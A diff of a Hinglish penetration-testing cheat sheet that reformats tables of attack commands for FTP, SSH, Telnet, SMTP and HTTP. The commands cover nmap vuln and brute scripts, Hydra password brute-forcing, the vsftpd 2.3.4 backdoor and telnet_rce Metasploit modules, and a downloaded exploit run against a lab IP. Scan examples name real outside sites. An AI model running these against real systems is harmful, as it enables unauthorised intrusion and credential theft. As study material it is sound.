@@ -42,115 +42,120 @@
 
 # All port command
 
-| **Command** | **Explanation (1 Line)** |
-| --- | --- |
-| 1] FTP (21) |  |
-| `nmap -p 21 <target ip>` | Only FTP port scan |
-| `nmap -p 21 <subnet>` | Subnet me kis-kis host ka **FTP port (21) open hai**, ye identify karta hai. |
-| `nmap -sV -sC  <target ip> -p 21` | best |
-| `nmap -sV -sC --script vuln <target_ip> -p 21` | vulnerability script use |
-| `ftp <target>` | when anonymous login allow  Username: anonymous |
-| `nc -nv <target> 21` | **Netcat Se FTP Service Check** |
-| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>` | **FTP Bruteforce (Hydra)** |
-| nmap --script=ftp-syst -p 21 <target> | **FTP server ke system type aur version ki details nikalne ke liye** |
-| nmap --script=ftp-brute -p 21 <target> | **FTP brute-force attack perform karne ke liye** |
-| nmap -sV --script=ftp-login -p 21 <target> | Attempts login with credentials (default or supplied). with userlist and passlist |
-| nmap --script=ftp-anon -p 21 <target> | **Anonymous FTP login allow hai ya nahi yeh check karta hai** |
-| nmap --script=ftp-proftpd-backdoor -p 21 <target> | **ProFTPD vulnerability check karne ke liye** |
-|  searchsploit vsftpd 2.3.4   |  version pata chle to ye command dal sakte hai |
+
 |  searchsploit -m unix/remote/49757.py | aise hum doenload krege exploit ko   or use google github |
 | python3 [49757.py](http://49757.py/) -h   | -h means help command to check use of exploit |
 |  python3 [49757.py](http://49757.py/)  192.168.0.102 | usage: [49757.py](http://49757.py/) [-h] host    |
 | msfconsole |  |
-| search exploit vsftpd 2.3.4 |  |
-| search ftp |  |
-| use auxiliary/scanner/ftp/anonymous
+Command	Explanation (1 Line)
+1] FTP (21)	
+nmap -p 21 <target ip>	Only FTP port scan
+nmap -p 21 <subnet>	Subnet me kis-kis host ka FTP port (21) open hai, ye identify karta hai.
+nmap -sV -sC  <target ip> -p 21	best
+nmap -sV -sC --script vuln <target_ip> -p 21	vulnerability script use
+ftp <target>	when anonymous login allow  Username: anonymous
+nc -nv <target> 21	Netcat Se FTP Service Check
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>	FTP Bruteforce (Hydra)
+nmap --script=ftp-syst -p 21 <target>	FTP server ke system type aur version ki details nikalne ke liye
+nmap --script=ftp-brute -p 21 <target>	FTP brute-force attack perform karne ke liye
+nmap -sV --script=ftp-login -p 21 <target>	Attempts login with credentials (default or supplied). with userlist and passlist
+nmap --script=ftp-anon -p 21 <target>	Anonymous FTP login allow hai ya nahi yeh check karta hai
+nmap --script=ftp-proftpd-backdoor -p 21 <target>	ProFTPD vulnerability check karne ke liye
+ searchsploit vsftpd 2.3.4  	 version pata chle to ye command dal sakte hai
+ searchsploit -m unix/remote/49757.py	aise hum doenload krege exploit ko   or use google github
+python3 49757.py -h  	-h means help command to check use of exploit
+ python3 49757.py  192.168.0.102	usage: 49757.py [-h] host   
+msfconsole	
+search exploit vsftpd 2.3.4	
+search ftp	
+use auxiliary/scanner/ftp/anonymous
 set RHOSTS <target>
 run
- | **Using msfconsole Anonymous Login Test Karo** |
-| use auxiliary/scanner/ftp/ftp_login
+	Using msfconsole Anonymous Login Test Karo
+use auxiliary/scanner/ftp/ftp_login
 set RHOSTS <target>
 set USER_FILE /usr/share/wordlists/rockyou.txt
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run
- | **Brute-Force FTP Passwords** |
-| use auxiliary/scanner/ftp/ftp_version | Detects FTP version. |
-| use exploit/unix/ftp/vsftpd_234_backdoor
+	Brute-Force FTP Passwords
+use auxiliary/scanner/ftp/ftp_version	Detects FTP version.
+use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS <target>
 run
- |  **Exploit FTP Backdoor (vsftpd 2.3.4)** |
-| use exploit/unix/ftp/vsftpd_234_backdoor | Exploits vsFTPd 2.3.4 backdoor vulnerability. |
-| —————————————————————— | ————————————————————————————————— |
-| 2] ssh (22) |  |
-| `nmap -sV -sC --script vuln <target_ip> -p 22` | ssh port scan with vuln script |
-| ssh username@ip_address
- | ssh port me login using valid credencial |
-| **ssh nmap script   /usr/share/nmap/scripts** |  |
-| $ ls |grep ssh
+	 Exploit FTP Backdoor (vsftpd 2.3.4)
+use exploit/unix/ftp/vsftpd_234_backdoor	Exploits vsFTPd 2.3.4 backdoor vulnerability.
+	
+2] ssh (22)	
+nmap -sV -sC --script vuln <target_ip> -p 22	ssh port scan with vuln script
+ssh username@ip_address
+	ssh port me login using valid credencial
+ssh nmap script   /usr/share/nmap/scripts	
+$ ls |grep ssh
 ssh2-enum-algos.nse
 ssh-auth-methods.nse
-ssh-brute.nse |  |
-| nmap -p22 192.168.0.106 --script=ssh-brute.nse | single nmap script use  |
-| nmap -p 22 --script=ssh-* <target>
- | nmap all script use at one time |
-| hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
- |   ssh **Bruteforce (Hydra)** |
-| msfconsole   |  |
-| search ssh    OR     search ssh_login
- |  |
-| use auxiliary/scanner/ssh/ssh_login
+ssh-brute.nse	
+nmap -p22 192.168.0.106 --script=ssh-brute.nse	single nmap script use 
+nmap -p 22 --script=ssh-* <target>
+	nmap all script use at one time
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
+	  ssh Bruteforce (Hydra)
+msfconsole  	
+search ssh    OR     search ssh_login
+	
+use auxiliary/scanner/ssh/ssh_login
 set RHOSTS <target>
 set USERNAME root
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run
- | **SSH Brute-Force via Metasploit** |
-| use auxiliary/scanner/ssh/ssh_identify_pubkeys
+	SSH Brute-Force via Metasploit
+use auxiliary/scanner/ssh/ssh_identify_pubkeys
 set RHOSTS <target>
 run
- |  **Agar weak key mili, toh tum login kar sakte ho!** |
-| —————————————————————— | ————————————————————————————————— |
-| 3] Telnet (23) |  |
-| nmap -sV -p 23 <target> | Telnet port (23) with service/version detection. |
-| nmap -p 23 -sC -sV <target> | Scans port 23 using default scripts + version detection.  |
-| nmap -p 23 --script=telnet-brute <target ip> | Performs brute-force attack using a user/pass list.  |
-| > nmap -p 23 --script=telnet-logout <target ip> | Checks how the Telnet server responds after login/logout. set userfile passfile |
-| telnet  <target ip> 23 | username passname jb pata chal jaye. |
-| nmap -p 23 --script=telnet-banner <target ip> | identify old /vulnenability version. |
-| nmap -p 23 --script "telnet-*” | Runs all available Telnet NSE scripts in one go. |
-| telnet [T.Ip] [Port no.]   |  Login telnet port |
-| Metasploit  |  |
-| search telnet | Lists all Telnet-related modules (scanner, login, exploits). |
-| use auxiliary/scanner/telnet/telnet_version | use auxiliary/scanner/telnet/telnet_version |
-| > use auxiliary/scanner/telnet/telnet_login | Performs brute-force attack on Telnet with user/pass list. |
-| use exploit/unix/misc/telnet_rce | Attempts Remote Code Execution via Telnet misconfig/vuln (less common) |
-| —————————————————————— | ————————————————————————————————— |
-| 4] SMTP (25,465,587) |  |
-| nmap -sV -p 25,465,587 <target ip> | SMTP ke tino popular ports scan karega (25, 465, 587) aur version dikhayega. |
-| nmap -p 23 --script vuln <target ip> | smtp vulnerability script  |
-| nmap -p 25 --script=smtp-commands <target ip> | SMTP server kaunsa-kaunsa command support karta hai woh dikhata hai. |
-| nmap -p 25 --script=smtp-enum-users <target ip> | SMTP par valid users enumerate karta hai (VRFY, EXPN, RCPT use karke) |
-| nmap -p25 192.168.0.106 --script=smtp-brute.nse | smtp brute force |
-| nmap -p 25 --script "smtp-*" <target ip> | Saare SMTP related scripts ek saath run karta hai. Full recon.  |
-| telnet <target ip> 25 | Manual SMTP Banner Grab |
-| metasploit |  |
-| search smtp |  |
-| use auxiliary/scanner/smtp/smtp_version | SMTP banner aur version extract karta hai. | |
-| > use auxiliary/scanner/smtp/smtp_enum | SMTP ke valid users enumerate karta hai (EXPN/VRFY se). |
-| nc <target ip> 25 |  |
-| use auxiliary/scanner/smtp/smtp_relay | SMTP open relay test karta hai (mail relay exploit). |
-| —————————————————————— | —————————————————————————————————- |
-| 5] http (80) |  |
-| nmap -p 80,443 -sV <target> |  Web server ke ports (HTTP/HTTPS) detect + version info milega. |
-| nmap -A 192.168.0.0/24  -p 80,445,8080 |grep WempServer | jis ip pe wempserver run ho rha hai wo batayega . |
-| nmap --script=http-enum -p 80 <target> | Common directories, paths jaise `/admin`, `/login` enumerate karta hai. |
-| nmap --script=http-methods -p 80 <target> | Kaunse HTTP methods allowed hain (GET, POST, PUT, DELETE, etc). PUT hone pe exploit possible! |
-| nmap --script=http-php-version -p 80 <target> | PHP version dikhata hai agar site PHP pe ho (useful for RCE bugs). |
-| nmap --script=http-robots.txt -p 80 <target> | robots.txt file ko read karta hai (hidden URLs ya admin links mil sakte hain). |
-| nmap --script=http-unsafe-output-escaping -p 80 <target> | XSS jaise client-side bug test karta hai.  |
-| **Loginpage brute force.** |  |
-| sudo hydra <username> <wordlist>  <Target ip> http-post-form “<path>:<login_credentials>:<invalid_response>” | formate |
-| sudo hydra -l  molly -P /usr/share/wordlists/rockyou.txt  <target ip/subdomain>  http-post-form “/login:username=^USER^&password=^PASS^:Your username or password is incorrect” -f  -V -I | eg. |
-| nmap --script=http-vuln-* -p 80 <target> | Sab HTTP related vulnerability NSE scripts ek saath run karta hai. | |
+	 Agar weak key mili, toh tum login kar sakte ho!
+	
+3] Telnet (23)	
+nmap -sV -p 23 <target>	Telnet port (23) with service/version detection.
+nmap -p 23 -sC -sV <target>	Scans port 23 using default scripts + version detection. 
+nmap -p 23 --script=telnet-brute <target ip>	Performs brute-force attack using a user/pass list. 
+> nmap -p 23 --script=telnet-logout <target ip>	Checks how the Telnet server responds after login/logout. set userfile passfile
+telnet  <target ip> 23	username passname jb pata chal jaye.
+nmap -p 23 --script=telnet-banner <target ip>	identify old /vulnenability version.
+nmap -p 23 --script "telnet-*”	Runs all available Telnet NSE scripts in one go.
+telnet [T.Ip] [Port no.]  	 Login telnet port
+Metasploit 	
+search telnet	Lists all Telnet-related modules (scanner, login, exploits).
+use auxiliary/scanner/telnet/telnet_version	use auxiliary/scanner/telnet/telnet_version
+> use auxiliary/scanner/telnet/telnet_login	Performs brute-force attack on Telnet with user/pass list.
+use exploit/unix/misc/telnet_rce	Attempts Remote Code Execution via Telnet misconfig/vuln (less common)
+	
+4] SMTP (25,465,587)	
+nmap -sV -p 25,465,587 <target ip>	SMTP ke tino popular ports scan karega (25, 465, 587) aur version dikhayega.
+nmap -p 23 --script vuln <target ip>	smtp vulnerability script 
+nmap -p 25 --script=smtp-commands <target ip>	SMTP server kaunsa-kaunsa command support karta hai woh dikhata hai.
+nmap -p 25 --script=smtp-enum-users <target ip>	SMTP par valid users enumerate karta hai (VRFY, EXPN, RCPT use karke)
+nmap -p25 192.168.0.106 --script=smtp-brute.nse	smtp brute force
+nmap -p 25 --script "smtp-*" <target ip>	Saare SMTP related scripts ek saath run karta hai. Full recon. 
+telnet <target ip> 25	Manual SMTP Banner Grab
+metasploit	
+search smtp	
+use auxiliary/scanner/smtp/smtp_version	SMTP banner aur version extract karta hai. |
+> use auxiliary/scanner/smtp/smtp_enum	SMTP ke valid users enumerate karta hai (EXPN/VRFY se).
+nc <target ip> 25	
+use auxiliary/scanner/smtp/smtp_relay	SMTP open relay test karta hai (mail relay exploit).
+	
+5] http (80)	
+nmap -p 80,443 -sV <target>	 Web server ke ports (HTTP/HTTPS) detect + version info milega.
+nmap -A 192.168.0.0/24  -p 80,445,8080 |grep WempServer	jis ip pe wempserver run ho rha hai wo batayega .
+nmap --script=http-enum -p 80 <target>	Common directories, paths jaise /admin, /login enumerate karta hai.
+nmap --script=http-methods -p 80 <target>	Kaunse HTTP methods allowed hain (GET, POST, PUT, DELETE, etc). PUT hone pe exploit possible!
+nmap --script=http-php-version -p 80 <target>	PHP version dikhata hai agar site PHP pe ho (useful for RCE bugs).
+nmap --script=http-robots.txt -p 80 <target>	robots.txt file ko read karta hai (hidden URLs ya admin links mil sakte hain).
+nmap --script=http-unsafe-output-escaping -p 80 <target>	XSS jaise client-side bug test karta hai. 
+Loginpage brute force.	
+sudo hydra <username> <wordlist>  <Target ip> http-post-form “<path>:<login_credentials>:<invalid_response>”	formate
+sudo hydra -l  molly -P /usr/share/wordlists/rockyou.txt  <target ip/subdomain>  http-post-form “/login:username=^USER^&password=^PASS^:Your username or password is incorrect” -f  -V -I	eg.
+nmap --script=http-vuln-* -p 80 <target>	Sab HTTP related vulnerability NSE scripts ek saath run karta hai. |
+	
 | **CMS & Directory Enumeration** |  |
 | whatweb <target url>                                                    whatweb https://orane.com/   | // findout cms name, servername, email, ip, os, servername, country website, CMS detection tool (WordPress, Joomla, Drupal, etc)   or wappalyzer extension |
 | droopescan scan joomla --url https://www.aiims.edu/ |   |
